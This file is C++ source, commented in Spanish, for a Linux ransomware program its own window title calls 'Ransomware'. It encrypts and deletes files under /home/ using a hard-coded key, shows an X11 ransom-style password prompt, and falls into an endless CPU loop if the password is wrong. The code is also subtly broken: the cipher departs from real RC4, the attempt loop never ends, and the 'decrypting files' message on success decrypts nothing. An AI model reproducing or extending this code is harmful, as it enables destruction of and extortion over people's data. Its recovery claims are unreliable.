#include <iostream>
#include <fstream>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>
#include <signal.h>
#include <cstdlib>
#include <string>
#include <vector>
#include <thread>
#include <mutex>
#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <X11/cursorfont.h>

// Contraseña correcta
const std::string correct_pass = "himself9864";

// Función para encriptar con RC4 (mismo algoritmo que antes)
void encriptarArchivo(const std::string& ruta) {
    std::ifstream archivo(ruta, std::ios::binary);
    if (!archivo) return;

    std::vector<unsigned char> datos((std::istreambuf_iterator<char>(archivo)), std::istreambuf_iterator<char>());
    archivo.close();

    std::vector<unsigned char> clave = { 0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0 };

    std::vector<unsigned char> estado(256);
    for (size_t i = 0; i < 256; ++i) estado[i] = static_cast<unsigned char>(i);
    std::vector<unsigned char> clave_estado(clave.size());
    size_t j = 0;
    for (size_t i = 0; i < 256; ++i) {
        j = (j + estado[i] + clave[i % clave.size()]) % 256;
        std::swap(estado[i], estado[j]);
    }

    std::vector<unsigned char> datos_encriptados(datos.size());
    j = 0;
    for (size_t i = 0; i < datos.size(); ++i) {
        j = (j + 1) % 256;
        std::swap(estado[i % 256], estado[j]);
        unsigned char k = estado[(i + j) % 256];
        datos_encriptados[i] = datos[i] ^ k;
    }

    std::string ruta_encrypted = ruta + ".encrypted";
    std::ofstream archivo_encrypted(ruta_encrypted, std::ios::binary);
    if (archivo_encrypted) {
        archivo_encrypted.write((char*)&datos_encriptados[0], datos.size());
        archivo_encrypted.close();
        std::remove(ruta.c_str());
    }
}

// Función para verificación de contraseña (GUI con X11)
bool verificarContraseñaX11() {
    Display* display = XOpenDisplay(nullptr);
    if (!display) return false;

    Window ventana = XCreateSimpleWindow(display, RootWindow(display, 0), 100, 100, 500, 300, 0,
                                            BlackPixel(display, 0), WhitePixel(display, 0));

    Atom wm_delete_message = XInternAtom(display, "WM_DELETE_WINDOW", True);
    XSetWMProtocols(display, ventana, &wm_delete_message, 1);

    XMapWindow(display, ventana);
    XEvent evento;
    XSelectInput(display, ventana, ButtonPressMask | KeyPressMask);

    // Etiqueta para mostrar mensaje
    XStoreName(display, ventana, "Ransomware: Contraseña requerida");
    XMapWindow(display, ventana);

    std::string mensaje = "Tu sistema está encriptado. Introduce la contraseña: ";
    std::string mensaje_error = "Contraseña incorrecta. Intentos restantes: ";
    std::string mensaje_final = "¡Contraseña incorrecta! Tu sistema ahora está inutilizable.";

    for (int intentos = 3; intentos > 0; --intentos) {
        XClearWindow(display, ventana);
        XDrawString(display, ventana, DefaultGC(display, 0), 10, 20, mensaje.c_str(), mensaje.size());

        char buffer[256];
        int key = 0;
        while (true) {
            XNextEvent(display, &evento);
            if (evento.type == KeyPress) {
                key = XKeycodeToKeysym(display, evento.xkey.keycode, 0);
                if (key == XK_Return) {
                    std::string input;
                    std::cin >> input;
                    if (input == correct_pass) {
                        XCloseDisplay(display);
                        return true;
                    } else {
                        XDrawString(display, ventana, DefaultGC(display, 0), 10, 20, mensaje_error.c_str(), mensaje_error.size());
                        XFlush(display);
                        sleep(1);
                    }
                }
            }
        }
    }

    XDrawString(display, ventana, DefaultGC(display, 0), 10, 20, mensaje_final.c_str(), mensaje_final.size());
    XFlush(display);

    XCloseDisplay(display);
    return false;
}

// Función para inutilizar el sistema (bucle de CPU)
void inutilizarSistema() {
    std::cout << "¡Sistema inutilizado! Presiona Ctrl+C para detener.\n";
    while (true) {
        // Bucle de CPU
    }
}

// Función principal
int main() {
    // Encriptar archivos (ejemplo: /home/)
    std::string directorio = "/home/";
    DIR* dir = opendir(directorio.c_str());
    if (dir) {
        struct dirent* entry;
        while ((entry = readdir(dir)) != nullptr) {
            std::string nombre_archivo = entry->d_name;
            if (nombre_archivo != "." && nombre_archivo != "..") {
                std::string ruta_completa = directorio + nombre_archivo;
                encriptarArchivo(ruta_completa);
            }
        }
        closedir(dir);
    }

    // Verificación de contraseña (GUI X11 bloquea hasta que se introduce)
    bool correcto = verificarContraseñaX11();
    if (!correcto) {
        inutilizarSistema(); // Sistema inutilizable
    }

    std::cout << "¡Contraseña correcta! Desencriptando archivos...\n";
    return 0;
}